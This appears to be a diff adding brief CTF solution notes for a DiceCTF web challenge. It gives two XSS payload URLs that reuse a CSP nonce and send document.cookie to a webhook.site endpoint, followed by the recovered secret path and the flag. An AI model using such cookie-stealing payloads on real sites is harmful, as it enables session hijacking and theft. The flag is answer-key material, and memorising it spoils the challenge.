@@ -1,0 +1,12 @@
+https://babier-csp.dicec.tf/?name=<script nonce=LRGWAXOY98Es0zz0QOVmag==>window.location="https://webhook.site/8ee5457c-df16-4b08-9dbc-b72af16bc1a2/cookie/"%2Bdocument.cookie;</script>
+	secret=4b36b1b8e47f761263796b1defd80745
+
+
+
+https://babier-csp.dicec.tf/4b36b1b8e47f761263796b1defd80745/
+	dice{web_1s_a_stat3_0f_grac3_857720}
+
+
+
+Other Payload
+	https://babier-csp.dicec.tf?name=</h1><script nonce="LRGWAXOY98Es0zz0QOVmag==">var head=document.getElementsByTagName('head')[0];var script=document.createElement('script');script.src=('https://webhook.site/8ee5457c-df16-4b08-9dbc-b72af16bc1a2/?flag='.concat(JSON.stringify(document.cookie)));script.nonce="LRGWAXOY98Es0zz0QOVmag==";head.appendChild(script);</script></h1>
